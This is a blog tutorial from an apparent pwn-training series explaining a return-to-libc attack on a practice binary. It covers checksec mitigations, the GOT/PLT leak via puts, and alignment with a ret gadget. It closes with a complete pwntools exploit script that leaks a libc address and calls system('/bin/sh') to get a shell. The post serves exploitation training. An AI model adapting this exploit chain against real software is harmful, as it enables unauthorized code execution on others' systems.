---
layout: post
author: tourpran
title: Return to libc
categories: pwn-training
tags: ["libc leak", "ret2libc"]
---

![](/assets/images/pwntraining3/pwntrain1.png)

### Introduction:

In this blog we will be trying to leak a libc address and try to get a shell by calling system. Here we will look into 2 challenges with similar attacks but slight variations.

### Challenge 1:

Here we are given a binary and the source for the binary.

[vuln binary](/assets/images/pwntraining3/ret2libc) and 
[vuln c code](/assets/images/pwntraining3/ret2libc.c)

### Solution:

#### Mitigations: 

Lets check out the mitigations for this program.
```bash
checksec --file ./ret2libc
```

![](/assets/images/pwntraining3/pwntrain2.png)

If you don't have checksec installed then 
```bash
sudo apt install checksec
```

RELRO:
* Partial RELRO - the got is writeable, nothing much to bother here.


CANARY:
* No canary, we can do a overflow peacefully :)

No eXecute:
* NX Enabled - this makes sure that the code on the stack is not excecuted.


PIE:
* PIE Disabled, we know the address of all the code in the binary.

#### Code walkthrough:

main function: 

![](/assets/images/pwntraining3/pwntrain3.png)

Its simple and easy, just overflow the buffer with garbage value and fill the return with... with... wait... with what ? Since there is no win function as such what exactly will we do ? Can we somehow get a shell by leaking something ? Lets look at the idea behind this challenge.

#### Global Offset Table:

This challenge requires you to know the basics of GOT and PLT. In short GOT is a set of address that points to the function in the glibc (shared library). To know more about [Global offset table go ahead to my old blog](https://tourpran.me/blogs/2020/09/13/got-plt.html). 

#### Exploit Idea:

Our aim right now, is to leak an address in the libc (shared library). The reason is because we are not given any helper funciton in our program to get a shell, so we use the function in the libc called system with arguments "/bin/sh" to get a shell.

&#8594; We can use the puts function since its already called by our program, so the GOT of this function will be resolved ( real address pointing to libc will be filled ).

&#8594; puts function takes one input which is the string to be printed. What if we can call puts with puts ?  :thinking:

#### Pseudo code:

**note**: arguments to functions are stored via registers, the first argument is stored in RDI.

```.
"A"*(offset) + p64(address of pop RDI) +  p64(GOT address of puts) + p64(PLT address of puts) + p64(address of main)
```

This code will fill the buffer with garbage and store the GOT address of puts inside the RDI register and then calls puts, this will leak the puts libc address. 

* Now we have the libc puts address.
* All functions and variables in the libc is relative to one another, libc as a whole might change its position but the elements (functions, variables) will be at the same relative distance from one another.
* we can calculate the address of string "/bin/sh" and the address of system function, then we can call the system with the argument to pop a shell.

**note:** You might face a error in the statement movabs. If you encounter this problem, you can rectify it by adding a return instruction before the call to a glibc function, Since adding a return address will make the RSP 16 byte aligned.

#### Exploit:

In real life situation you are not probably using the same libc as the software dev, So to find out the libc version go to [libc.blukat.me](https://libc.blukat.me/).

So always the last 3 digits (hex) of the leak will be same. Use this as an advantage to select your libc version.

![](/assets/images/pwntraining3/pwntrain4.png)

Below is the commented solution. 

```py
#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './ret2libc'
elf = ELF("./ret2libc")

# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# ./exploit.py GDB
gdbscript = '''
b* 0x00000000004011c7
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.recvuntil("Are you in?") # recv the output sent by the program.
p.sendline(b"A"*0x60 + b"B"*8 + p64(0x0000000000401016) +  p64(0x000000000040122b) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym.main))
# filling the buffer and RBP + return instruction to tackle the alignment issues + pop RDI to fill it with address of the puts function. add main to return back to main function
p.recvline() # recv unwanted bytes.
leak_puts =hex( u64((p.recvline().rstrip()).ljust(8, b"\x00"))) # recv the puts function and strip the front and back, unpack it and store it as hex.

log.info("puts: "+str(leak_puts)) # make sure you get a address in the libc by logging it.

p.recvuntil("Are you in?") # recv output.
p.sendline(b"B"*0x60 + b"C"*8 + p64(0x000000000040122b) + p64(int(leak_puts, 16) + 0x13000a) + p64(int(leak_puts, 16)-0x32190))
# fill garbage in buffer and pop RDI to fill it with a pointer to "bin/sh" call system.

p.interactive()

```